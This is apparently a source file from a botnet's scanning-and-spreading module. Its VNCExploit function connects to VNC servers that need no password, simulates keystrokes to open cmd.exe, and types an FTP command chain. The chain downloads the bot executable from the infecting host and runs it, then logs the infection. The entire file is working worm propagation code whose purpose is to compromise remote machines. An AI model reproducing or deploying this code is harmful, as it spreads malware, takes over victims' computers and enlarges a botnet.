#include "asn.h"
#include "defines.h"
#include "advscan.h"
#include "../sdcompat.h"
#include "../mainctrl.h"

#define MAX_SEND 8 
#define MAX_RECV 64 

#ifndef NO_VNC 

char text_cmd[] = "%systemroot%\\system32\\cmd.exe"; 
char text_exit[] = "exit"; 
char text_tftp[256] = {0}; 

void send_key(SOCKET SOCK, char *szKey, DWORD dwKeyState = 0) 
{ 
   char szVNCSendKey[] = "\x04", 
       szKeyDown[] = "\x01", 
       szKeyUp[] = "\x00", 
       szNullBytes_1[] = "\x00\x00\x00\x00", 
       szNullBytes_2[] = "\x00\x00\x00\x00\x00"; 

   //Can't use _snprintf to just send one bit of data because of null bytes 
   if (dwKeyState == 0) 
   { 
      for (int i = 0; i <= 1; i++) 
      { 
         switch (i) 
         { 
         case 0: 
            send(SOCK, szVNCSendKey, 1, 0); 
            send(SOCK, szKeyDown, 1, 0); 

            if (strlen(szKey) == 2) 
               send(SOCK, szNullBytes_1, 4, 0); 
            else 
               send(SOCK, szNullBytes_2, 5, 0); 

            send(SOCK, szKey, strlen(szKey), 0); 

            break; 
         case 1: 
            send(SOCK, szVNCSendKey, 1, 0); 
            send(SOCK, szKeyUp, 1, 0); 

            if (strlen(szKey) == 2) 
               send(SOCK, szNullBytes_1, 4, 0); 
            else 
               send(SOCK, szNullBytes_2, 5, 0); 
    
            send(SOCK, szKey, strlen(szKey), 0); 

            break; 
         } 
      } 
   } 
   else { 
      switch (dwKeyState) 
      { 
      case 1: 
         send(SOCK, szVNCSendKey, 1, 0); 
         send(SOCK, szKeyDown, 1, 0); 

         if (strlen(szKey) == 2) 
            send(SOCK, szNullBytes_1, 4, 0); 
         else 
            send(SOCK, szNullBytes_2, 5, 0); 

         send(SOCK, szKey, strlen(szKey), 0); 

         break; 
      case 2: 
         send(SOCK, szVNCSendKey, 1, 0); 
         send(SOCK, szKeyUp, 1, 0); 

         if (strlen(szKey) == 2) 
            send(SOCK, szNullBytes_1, 4, 0); 
         else 
            send(SOCK, szNullBytes_2, 5, 0); 
    
         send(SOCK, szKey, strlen(szKey), 0); 

         break; 
      } 
   } 
} 

BOOL VNCExploit(EXINFO exinfo) 
{ 
   struct sockaddr_in sock; 
   SOCKET sVNC; 

   char szReceiveBuffer[MAX_RECV], 
       szChar[4], 
       szVersionPacket[] = "\x52\x46\x42\x20\x30\x30\x33\x2E\x30\x30\x38\x0A", 
       szServerPacket_1[] = "\x01\x02", 
       szServerPacket_2[] = "\x00\x00\x00\x00", 
       szClientPacket_1[] = "\x01", 
       szClientPacket_2[] = "\x01", 
       szKeyWindows[] = "\xFF\xEB", 
       szKeyArrowLeft[] = "\xFF\x51", 
       szKeyEnter[] = "\xFF\x0D", 
       szKeyR[] = "\x72"; 

   int iRecvBytes = 0, iAction = 0; 
   unsigned int i = 0; 

   if ((sVNC = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
   { 
      closesocket(sVNC); 
   } 

   sock.sin_family = AF_INET; 
   sock.sin_addr.s_addr = inet_addr(exinfo.ip); 
   sock.sin_port = htons((unsigned short)exinfo.port); 

   if ((connect(sVNC, (struct sockaddr *)&sock, sizeof(sock)))) 
   { 
      closesocket(sVNC); 
      return FALSE; 
   } 

   while (true) 
   { 
      memset(szReceiveBuffer, 0, sizeof(szReceiveBuffer)); 
      iRecvBytes = recv(sVNC, szReceiveBuffer, MAX_RECV, 0); 
      if (iRecvBytes <= 0 || iRecvBytes == SOCKET_ERROR) 
      { 
         break; 
      } 
      else 
      { 
         switch (iAction) 
         { 
         case 0: 
            if (!strcmp(szReceiveBuffer, szVersionPacket)) 
            { 
               send(sVNC, szVersionPacket, strlen(szVersionPacket), 0); 
               iAction++; 
            } 
            else 
            { 
               closesocket(sVNC); 
               return FALSE; 
            } 

            break; 
         case 1: 
            if (!strcmp(szReceiveBuffer, szServerPacket_1)) 
            { 
               send(sVNC, szClientPacket_1, strlen(szClientPacket_1), 0); 
               iAction++; 
            } 
            else 
            { 
               closesocket(sVNC); 
               return FALSE; 
            } 

            break; 
         case 2: 
            if (!strcmp(szReceiveBuffer, szServerPacket_2)) 
            { 
               iAction++; 
               break; 
            } 
            else 
            { 
               closesocket(sVNC); 
               return FALSE; 
            } 
         } 

         if (iAction == 3) { break; } 
      } 
   } 

   send(sVNC, szClientPacket_2, 1, 0); 

   //press WINKEY 
   send_key(sVNC, szKeyWindows, 1); 
   Sleep(1000); 

   //press and release R key 
   send_key(sVNC, szKeyR); 
   Sleep(1000); 

   //release WINKEY 
   send_key(sVNC, szKeyWindows, 2); 
   Sleep(1000); 

   //type in "cmd" 
   for (i = 0; i < strlen(text_cmd); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_cmd[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   send_key(sVNC, szKeyEnter); 
   Sleep(2000); 

   //set text_tftp line with tftp and all parameters needed 
   memset(text_tftp, 0, sizeof(text_tftp)); 
   _snprintf(text_tftp, sizeof(text_tftp) - 1, "echo open %s %d >> aa &echo user a a >> aa &echo binary >> aa &echo get %s >> aa &echo bye >> aa &ftp -n -v -s:aa &del aa &%s\r\n", GetIP(exinfo.sock), g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue, g_cMainCtrl.m_cBot.bot_filename.sValue.CStr(), g_cMainCtrl.m_cBot.bot_filename.sValue.CStr());

   //send text_tftp line 
   for (i = 0; i < strlen(text_tftp); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_tftp[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   Sleep(1000);
   send_key(sVNC, szKeyEnter); 
/*
   //wait for file to download 
   Sleep(30000); 

   //type in file name 
   for (i = 0; i < strlen(filename); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", filename[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   Sleep(1000); 
  send_key(sVNC, szKeyEnter); 

   //type in "exit" 
   for (i = 0; i < strlen(text_exit); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_exit[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 
*/
   //press ENTER 
   for (i = 0; i <= 1; i++) 
   { 
      Sleep(600); 
      send_key(sVNC, szKeyEnter); 
   } 

   AddEx(exinfo);

   Sleep(1000);
   closesocket(sVNC); 

   return TRUE; 

}
#endif;